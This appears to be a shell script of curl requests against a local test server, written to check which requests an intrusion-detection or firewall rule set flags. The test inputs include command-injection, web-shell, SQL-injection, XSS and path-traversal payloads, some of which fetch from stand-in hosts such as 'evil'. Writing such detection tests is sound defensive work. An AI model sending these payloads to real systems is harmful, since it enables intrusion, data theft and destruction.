# set BASE_URL if you want: export BASE_URL="http://localhost:8080"
BASE_URL="${BASE_URL:-http://localhost:8080}"

# --- Command-execution / RCE-like (expected trigger)
curl -sS --max-time 10 "$BASE_URL/uploads/testshell.php?cmd=id"                       # EXPECT: trigger (cmd id)
curl -sS --max-time 10 "$BASE_URL/index.php?exec=whoami"                              # EXPECT: trigger (exec param)
curl -sS --max-time 10 "$BASE_URL/index.php?system=uname%20-a"                        # EXPECT: trigger (system uname -a)
curl -sS --max-time 10 "$BASE_URL/index.php?shell=ls%20-la"                            # EXPECT: trigger (ls -la)
curl -sS --max-time 10 "$BASE_URL/uploads/testshell.php?cmd=whoami;curl%20http://1.2.3.4/p" # EXPECT: trigger (compound: ;curl remote)

# --- Command + wget / remote fetch (expected trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%3Bwget%20http%3A%2F%2Fevil%2Fpayload%20-O%20%2Ftmp%2Fp" # EXPECT: trigger (wget payload)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%63%75%72%6c%20http%3A%2F%2Fevil"      # EXPECT: trigger (percent-encoded "curl http://evil")
curl -sS --max-time 10 "$BASE_URL/index.php?id=$(curl%20http%3A%2F%2Fevil)"            # EXPECT: trigger (nested curl — encoded)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%63%75%72%6c%20http%3A%2F%2Fexample.com" # EXPECT: trigger (encoded curl to host)

# --- Shell metacharacter injection (expected trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1;cat%20%2Fetc%2Fpasswd"                 # EXPECT: trigger (1;cat /etc/passwd)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1&&id"                                  # EXPECT: trigger (&& operator)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%7Cwhoami"                              # EXPECT: trigger (| whoami)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%253Bcat%2520%2Fetc%2Fpasswd"           # EXPECT: trigger (double-encoded ;)

# --- SQLi-like (expected trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1+UNION+SELECT+username,password+FROM+users" # EXPECT: trigger (UNION SELECT)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%20union%20select%20*%20from%20products"   # EXPECT: trigger (union select)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%20select%20name%20from%20users"           # EXPECT: trigger (select ... from users)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1'%20OR%201=1%20--"                         # EXPECT: trigger ("' OR 1=1 --")

# --- SQL-looking but safe/no-trigger examples (expected no trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?q=selecting+best+options"                     # EXPECT: no trigger (word "selecting" in ordinary context)
curl -sS --max-time 10 "$BASE_URL/index.php?id=list-files"                                # EXPECT: no trigger (harmless id)
curl -sS --max-time 10 "$BASE_URL/index.php?id=caller123"                                 # EXPECT: no trigger (alphanumeric)

# --- XSS payloads (expected trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%3Cscript%3Ealert(1)%3C%2Fscript%3E"         # EXPECT: trigger (classic script tag)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%3Cimg%20src=x%20onerror=alert(1)%20/%3E"    # EXPECT: trigger (img onerror)
curl -sS --max-time 10 "$BASE_URL/index.php?id=javascript:alert(1)"                        # EXPECT: trigger (javascript: URI)

# --- XSS lookalikes that should NOT trigger (expected no trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%253C3+is+love"                              # EXPECT: no trigger (encoded %253C => literal "%3")
curl -sS --max-time 10 "$BASE_URL/index.php?id=onboarding=1"                               # EXPECT: no trigger (param name looks like "onboarding")

# --- Mixed payload / multi-rule tests (expected trigger for multiple rule IDs)
curl -sS --max-time 10 "$BASE_URL/uploads/testshell.php?cmd=whoami;curl%20http%3A%2F%2Fevil%2Fpayload" # EXPECT: trigger rules 1000;1001;1002 maybe

# --- Obfuscated / URL-encoded variants (expected trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%252BUNION%252BSELECT%252Busername%2Cpassword" # EXPECT: trigger (double-encoded UNION)
curl -sS --max-time 10 "$BASE_URL/index.php?id=%3Cscript%3E%6A%73%6F%6E%3C%2Fscript%3E"         # EXPECT: trigger (script with encoded letters)

# --- Benign-looking uses of words that could confuse signatures (expected no trigger)
curl -sS --max-time 10 "$BASE_URL/index.php?note=please+select+an+option"                       # EXPECT: no trigger
curl -sS --max-time 10 "$BASE_URL/index.php?search=cat+breeds"                                 # EXPECT: no trigger

# --- Edge cases: separators vs commas (some rules only trigger on specific separators)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1,cat%20%2Fetc%2Fpasswd"                        # EXPECT: NO_TRIGGER (comma-separated, may not match)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1+%3B+DROP+TABLE+users"                         # EXPECT: trigger (encoded ; DROP)

# --- A few extra variations to exercise detection and decoding logic
curl -sS --max-time 10 "$BASE_URL/index.php?id=%27%3B%20INSERT%20INTO%20orders%20VALUES(1)%3B%2F%2F" # EXPECT: trigger (SQL insert attempt)
curl -sS --max-time 10 "$BASE_URL/index.php?id=1%20%3B%20%2Fbin%2Fsh%20-c%20%22id%22"            # EXPECT: trigger (shell -c "id")
curl -sS --max-time 10 "$BASE_URL/index.php?id=../../etc/passwd"                                # EXPECT: trigger (path traversal style)
curl -sS --max-time 10 "$BASE_URL/index.php?id=normal_value_with_123"                           # EXPECT: no trigger (harmless)
